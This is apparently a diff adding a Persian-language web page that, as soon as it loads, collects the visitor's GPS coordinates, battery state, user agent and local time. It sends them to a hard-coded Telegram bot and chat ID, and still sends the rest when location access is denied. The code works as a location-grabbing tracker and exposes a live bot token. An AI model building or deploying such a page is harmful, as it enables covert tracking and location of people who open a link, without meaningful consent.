@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8" />
+  <title>ارسال اطلاعات به تلگرام</title>
+  <style>
+    body { font-family: Tahoma, sans-serif; direction: rtl; padding: 20px; background: #f0f0f0; color: #333; }
+    #status { background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.1); white-space: pre-wrap; min-height: 100px; }
+  </style>
+</head>
+<body>
+  <h1>ارسال اطلاعات دستگاه به تلگرام</h1>
+  <p>لطفاً منتظر بمانید...</p>
+  <pre id="status">در حال آماده‌سازی...</pre>
+
+<script>
+  const statusEl = document.getElementById('status');
+
+  async function sendToTelegram(msg) {
+    const token = "8179792057:AAFqJdoVXJOp5QK13fVbskZgojZVdVdhkgs";
+    const chat_id = "309120647";
+    const text = encodeURIComponent(msg);
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}`;
+
+    try {
+      const res = await fetch(url);
+      if (res.ok) {
+        statusEl.textContent += "\n✅ اطلاعات با موفقیت ارسال شد.";
+      } else {
+        statusEl.textContent += `\n❌ ارسال اطلاعات ناموفق بود. کد خطا: ${res.status}`;
+      }
+    } catch (error) {
+      statusEl.textContent += `\n❌ خطا در ارسال اطلاعات: ${error.message}`;
+    }
+  }
+
+  async function collectData() {
+    let battery = "نامشخص";
+    if (navigator.getBattery) {
+      try {
+        const batt = await navigator.getBattery();
+        battery = `${Math.round(batt.level * 100)}% ${batt.charging ? '(در حال شارژ)' : ''}`;
+      } catch {
+        battery = "خطا در دریافت وضعیت باتری";
+      }
+    }
+
+    const device = navigator.userAgent;
+    const time = new Date().toLocaleString();
+
+    if (navigator.geolocation) {
+      statusEl.textContent = "⏳ در حال گرفتن موقعیت جغرافیایی...";
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const msg = `📍 موقعیت: ${lat}, ${lon}\n🔋 باتری: ${battery}\n🕒 زمان: ${time}\n📱 دستگاه: ${device}`;
+          sendToTelegram(msg);
+        },
+        err => {
+          statusEl.textContent = "⚠️ دسترسی به موقعیت رد شد.";
+          const msg = `❌ دسترسی به موقعیت داده نشد\n🔋 باتری: ${battery}\n🕒 زمان: ${time}\n📱 دستگاه: ${device}`;
+          sendToTelegram(msg);
+        }
+      );
+    } else {
+      statusEl.textContent = "⚠️ مرورگر شما از موقعیت پشتیبانی نمی‌کند.";
+      const msg = `📍 موقعیت ناموجود\n🔋 باتری: ${battery}\n🕒 زمان: ${time}\n📱 دستگاه: ${device}`;
+      sendToTelegram(msg);
+    }
+  }
+
+  collectData();
+</script>
+</body>
+</html>
